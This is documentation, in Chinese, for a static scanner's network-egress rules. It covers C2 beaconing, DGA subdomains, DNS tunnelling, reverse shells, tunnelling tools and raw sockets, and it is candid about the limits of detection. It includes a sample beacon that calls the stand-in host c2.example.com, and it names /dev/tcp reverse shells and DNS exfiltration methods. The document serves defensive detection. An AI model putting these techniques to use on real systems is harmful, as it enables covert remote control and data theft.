# C2 信标与可疑外联检测

## 1. 什么是 C2 信标（Beaconing）

C2（Command & Control）是攻击者与被控机之间的远控通道。为保持隐蔽与持久，恶意软件常以**固定间隔回连**控制端，这种周期性回连就是"信标"。静态代码里它的形态很典型：

```
sleep(60)
requests.get("c2.example.com/cmd")
```

即"sleep 之后紧跟外联调用"。本工具用 `NET-C2-BEACON` 规则捕获这种 `sleep(...)...外联` 的紧邻形态作为可疑信号。注意这是**启发式**，会漏掉非固定间隔、或把 sleep 与外联拆分的写法——诚实边界必须写明。

## 2. DGA 与超长随机子域

恶意软件常用 DGA（Domain Generation Algorithm）动态生成大量随机域名，从中挑少量做 C2 解析，规避固定黑名单。`NET-C2-KNOWN` 规则用"16+ 位十六进制子域或 20+ 位随机字母子域"作为 DGA/C2 特征信号。这会把个别合法长随机串（如某些 CDN 指纹）误报，规则设计上**仅作提示、不自动定性**，由人结合上下文判断。

## 3. DNS 隧道

DNS 本用于域名解析，却天然适合外泄：把数据 base64/hex 后拼进子域名，一次次查询把数据"带"出去。因为很多网络不对出站 DNS 做深度检测，`NET-DNS-EXFIL` 专抓"编码数据紧邻 DNS 解析"的写法。配套 `NET-DNS-DYNAMIC` 标记动态域名服务（dyndns/no-ip/duckdns），它们常被用作随时切换的 C2 解析入口。

## 4. 反弹 shell 与隧道

`/dev/tcp/`、`/dev/udp/` 是 bash 内置的网络重定向，常用于反弹 shell——直接把 shell 交给外部。这是整机沦陷级风险，`NET-TUNNEL-REVSHELL` 直接标极端。`NET-TUNNEL-PROXY` 覆盖 ngrok/frp/ssh -R 这类内网穿透，它们是运维常用工具，也是外泄与横向移动的便捷通道，需审批而非禁止。

## 5. 原始套接字与造包

`SOCK_RAW`/`AF_PACKET`/`scapy` 能抓全网流量、伪造数据包，能力极强。`NET-RAW-SOCKET` 与 `NET-RAW-PACKET` 标为高/中，提示"这是底层网络能力，非必要不开放"。这类通道在应用层不可见，属于"不可阻断"——需要网络层 ACL 与观测才能管控。

## 6. 检测的方法论边界

所有上述规则都是**静态正则启发式**，能力天花板很低：

- 加密隧道、域名分段、白名单内跳板二次转发——全漏。
- 变量名/调用形态稍变——可能漏或误报。
- 多步拼装（数据先存变量、隔很多行再发）——可能漏。

因此本工具的价值不在"拦住"，而在"在你写代码时提醒你：这段代码开了一个出口，你想清楚它该往哪走、谁能拦了吗"。真正的出口安全要靠运行时的出口过滤 + 审计 + 监控，本工具是那之前的一盏灯。
